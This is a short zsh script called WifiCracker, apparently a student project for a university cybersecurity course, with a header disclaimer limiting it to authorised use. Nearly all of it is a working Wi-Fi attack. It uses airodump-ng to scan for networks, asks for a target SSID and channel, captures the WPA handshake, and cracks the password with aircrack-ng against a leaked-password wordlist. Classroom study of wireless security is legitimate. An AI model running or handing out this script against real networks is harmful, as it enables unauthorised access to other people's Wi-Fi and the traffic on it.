#!/usr/bin/zsh


################################################################################
#	Program Name:	WifiCracker					       #
#	Written by: 	Derek Walker					       #
#	For: 		CYBR 362 Fall 22' Metropolitan State University	       #
#	Instructor:	Kaled Rabieh					       #
#									       #
#	This script is for educational purposes only and shall not be used     #
#	for any malicious or otherwise illegal purpose.	Using the following    #
#	script against targets that you don't own and/or have express written  #
#	consent to attack is a violation of the Computer Fraud and Abuse Act   #
#	and a felony offense.						       #
#									       #
#	The purpose of this script is to capture the WiFi handshake of a       #
#	device connecting to a wireless access point by listening to the       #
#	signals being broadcast. Afterwards, the password is extracted 	       #
#	from the captured packets by utilizing aircrack-ng and displayed.      #
################################################################################

#Stop potentially confilcting processes
#airmon-ng check kill

#Set wireless adapter to "monitor" mode
#airmon-ng start wlan0

#Allows time to find target SSID & channel of operation
timeout --foreground 15s airodump-ng wlan0

#Prompt user for target attack parameters
echo "Target SSID:"
read Target_SSID
echo "Target SSID set to $Target_SSID"

echo "\nSSID channel:"
read SSID_ch
echo "Target channel set to $SSID_ch"

echo "\nFilepath to save pcap data:"
read Pcap_Filepath
echo "Pcap_Filepath set to $Pcap_Filepath"


#Begin packet capture on target for 30 seconds
timeout --foreground 30s airodump-ng wlan0 --essid $Target_SSID -c $SSID_ch -w $Pcap_Filepath

aircrack-ng $Pcap_Filepath-01.cap -w /home/kali/Desktop/Project_Files/rockyou_project.txt -e $Target_SSID

#/home/kali/Desktop/Project_Files/project_cap

